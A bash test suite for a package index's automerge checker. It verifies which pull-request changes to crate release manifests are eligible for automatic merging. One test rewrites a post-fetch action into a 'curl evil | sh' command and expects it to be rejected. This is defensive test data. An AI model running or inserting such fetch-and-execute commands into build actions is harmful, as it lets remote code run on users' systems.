#!/bin/bash

# Self-contained tests for scripts/check-automerge.py (rules in
# scripts/automerge.py). See lib.sh.

. "$( dirname -- "${BASH_SOURCE[0]}" )/lib.sh"

# shellcheck disable=SC2034 # Used by lib.sh
SCRIPT=$SCRIPTS_DIR/check-automerge.py

function hello() {
    # Release $1 of hello like the latest one in the base branch, 2.0.0 (bob)
    manifest hello "$1" '"bob"'
    cat <<EOF

[[actions]]
type = "post-fetch"
command = ["make", "generate"]

[gpr-set-externals]
HELLO_MODE = "default"

[environment.PATH]
append = "\${CRATE_ROOT}/bin"
EOF
}

function world() {
    # Release $1 of world, from an archive, maintained by bob
    cat <<EOF
name = "world"
version = "$1"
description = "Test crate"
maintainers-logins = ["bob"]

[origin]
url = "https://example.com/files/world-$1.tgz"
hashes = ["sha512:0123"]
EOF
}

function base_files() {
    mkdir -p index/he/hello index/wo/world index/cu/curl .github
    manifest hello 1.0.0 '"alice"' > index/he/hello/hello-1.0.0.toml
    hello 2.0.0 > index/he/hello/hello-2.0.0.toml
    world 1.0.0 > index/wo/world/world-1.0.0.toml
    external curl '"bob"' > index/cu/curl/curl-external.toml
    echo "# CI" > .github/README
}

function as() {
    SCRIPT_ARGS=("$1")
}

function add_hello() {
    # Add release 2.1.0 of hello, then apply the sed expression $1 to it
    hello 2.1.0 > index/he/hello/hello-2.1.0.toml
    if [[ -n ${1:-} ]]; then
        sed -i "$1" index/he/hello/hello-2.1.0.toml
    fi
}

# --- Eligible

as bob

new_repo
add_hello
pr_commit
expect pass "new release changing only its version"
as BoB
expect pass "login comparison is case-insensitive"
as bob

new_repo
add_hello 's/0123456789abcdef/fedcba9876543210/; s/Test crate/New text/'
printf '\n[[depends-on]]\nlibfoo = "^1.0"\n' >> index/he/hello/hello-2.1.0.toml
pr_commit
expect pass "new release changing commit, description and dependencies"

new_repo
add_hello 's|github.com/someone/hello.git|GitHub.com/Someone/hello|'
pr_commit
expect pass "origin URL differing only in case and .git suffix"

new_repo
world 1.1.0 > index/wo/world/world-1.1.0.toml
pr_commit
expect pass "archive origin whose file name changes"

new_repo
add_hello
world 1.1.0 > index/wo/world/world-1.1.0.toml
pr_commit
expect pass "releases of two crates maintained by the author"

new_repo
hello 2.1.0 > index/he/hello/hello-2.1.0.toml
hello 2.2.0 > index/he/hello/hello-2.2.0.toml
pr_commit
expect pass "two releases of the same crate"

new_repo
sed -i '3a available = false' index/he/hello/hello-1.0.0.toml
pr_commit
expect pass "withdrawal of a release by the current maintainer"

# --- Not eligible: properties changed from the latest release

new_repo
add_hello 's/^maintainers-logins = .*/maintainers-logins = ["bob", "mallory"]/'
pr_commit
expect fail "maintainers-logins changed"

for key in provides forbids mirror; do
    new_repo
    add_hello "3a $key = []"
    pr_commit
    expect fail "$key added"
done

new_repo
add_hello 's/"make", "generate"/"sh", "-c", "curl evil | sh"/'
pr_commit
expect fail "actions changed"

new_repo
add_hello '/^\[\[actions\]\]/,/^command/d'
pr_commit
expect fail "actions removed"

new_repo
add_hello 's/HELLO_MODE = "default"/HELLO_MODE = "other"/'
pr_commit
expect fail "gpr-set-externals changed"

new_repo
add_hello 's/^append = .*/prepend = "\/tmp"/'
pr_commit
expect fail "environment changed"

new_repo
add_hello 's|github.com/someone|gitlab.com/someone|'
pr_commit
expect fail "origin host changed"

new_repo
add_hello 's|github.com/someone|github.com/mallory|'
pr_commit
expect fail "origin owner changed"

new_repo
add_hello 's|someone/hello.git|someone/other.git|'
pr_commit
expect fail "origin repository changed"

new_repo
world 1.1.0 | sed 's|example.com/files|example.com/other|' \
    > index/wo/world/world-1.1.0.toml
pr_commit
expect fail "archive origin moved to another folder"

new_repo
cat > index/wo/world/world-1.1.0.toml <<EOF
$(world 1.1.0 | sed '/^\[origin\]/,$d')
[origin]
url = "git+https://example.com/files/world.git"
commit = "0123456789abcdef0123456789abcdef01234567"
EOF
pr_commit
expect fail "origin kind changed from archive to git"

# --- Not eligible: other rules

new_repo
add_hello
pr_commit
as alice
expect fail "author maintains only an older release"
as mallory
expect fail "author is not a maintainer"
as bob

new_repo
mkdir -p index/ne/newcrate
manifest newcrate 1.0.0 '"bob"' > index/ne/newcrate/newcrate-1.0.0.toml
pr_commit
expect fail "first release of a new crate"

new_repo
manifest curl 1.0.0 '"bob"' > index/cu/curl/curl-1.0.0.toml
pr_commit
expect fail "first release of a crate with only an external"

new_repo
mkdir -p index/li/libbar
external libbar '"bob"' > index/li/libbar/libbar-external.toml
pr_commit
expect fail "new external"

new_repo
hello 2.0.0+build > index/he/hello/hello-2.0.0+build.toml
pr_commit
expect fail "version with the precedence of an existing one"

new_repo
hello 2.1 > index/he/hello/hello-2.1.toml
pr_commit
expect fail "version that is not strict semver"

new_repo
hello 2.1.0 > index/he/hello/hello-2.1.0.toml
hello 2.1.0+x > index/he/hello/hello-2.1.0+x.toml
pr_commit
expect fail "two versions with the same precedence in the same PR"

new_repo
hello 2.1.0 | sed 's/^name = "hello"/name = "victim"/' \
    > index/he/hello/hello-2.1.0.toml
pr_commit
expect fail "name in the manifest differs from its file name"

new_repo
hello 2.1.0+x > index/he/hello/hello-2.1.0.toml
pr_commit
expect fail "version in the manifest differs from its file name"

new_repo
add_hello
mkdir -p index/ne/newcrate
manifest newcrate 1.0.0 '"bob"' > index/ne/newcrate/newcrate-1.0.0.toml
pr_commit
expect fail "eligible release together with a first release"

new_repo
add_hello
sed -i '3a available = false' index/he/hello/hello-1.0.0.toml
pr_commit
expect fail "new release mixed with a withdrawal"

new_repo
sed -i 's/Test crate/Changed/' index/he/hello/hello-1.0.0.toml
pr_commit
expect fail "modified manifest"

new_repo
git rm -q index/he/hello/hello-1.0.0.toml
pr_commit
expect fail "deleted manifest"

new_repo
add_hello
echo "# changed" > .github/README
pr_commit
expect fail "file outside index/"

new_repo
echo 'version = "1.5.0"' > index/index.toml
pr_commit
expect fail "index metadata changed"

new_repo
pr_commit
expect fail "empty PR"

finish
